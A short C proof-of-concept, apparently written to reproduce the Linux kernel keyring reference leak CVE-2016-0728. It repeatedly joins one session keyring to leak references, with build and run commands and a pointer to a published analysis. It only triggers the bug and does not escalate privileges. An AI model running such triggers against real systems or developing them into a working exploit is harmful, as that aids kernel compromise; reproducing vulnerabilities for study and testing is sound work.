#include <stddef.h>
#include <stdio.h>
#include <sys/types.h>
#include <keyutils.h>

/* 
 * This code is refered from
 * https://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
 *
 * gcc -o leak leak.c -lkeyutils
 * ./leak
 * cat /proc/keys
 */

int main(int argc, char **argv)
{
	int i = 0;
	key_serial_t serial;

	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring3");
	if (serial < 0) {
		perror("keyctl - first join\n");
		return -1;
	}
	printf("serial : %d\n", serial);

	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL) < 0) {
		perror("keyctl - setperm\n");
		return -1;
	}

	for (i=0; i<100; i++) {
		serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring3");
		if (serial < 0) {
			perror("keyctl - loop join\n");
			return -1;
		}
	}

	return 0;
}
